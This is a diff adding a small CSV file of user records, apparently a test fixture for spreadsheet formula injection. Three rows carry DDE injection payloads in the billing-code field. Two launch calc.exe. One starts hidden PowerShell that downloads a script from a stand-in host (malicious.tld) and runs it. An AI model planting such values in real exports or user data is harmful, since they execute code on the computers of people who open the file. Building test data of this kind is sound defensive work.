@@ -1,0 +1,5 @@
+id,username,email,export_billing_code
+101,admin,admin@local.internal,99402
+102,malicious_actor,attacker@remote.com,=cmd|' /c calc.exe '!A1
+103,user_test,test@local.internal,-5+2+cmd|' /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri http://malicious.tld/payload.ps1 -OutFile $env:tmp/p.ps1; Start-Process $env:tmp/p.ps1'!A1
+104,j_doe,jdoe@local.internal,@SUM(1,2)*cmd|' /c calc.exe '!A1
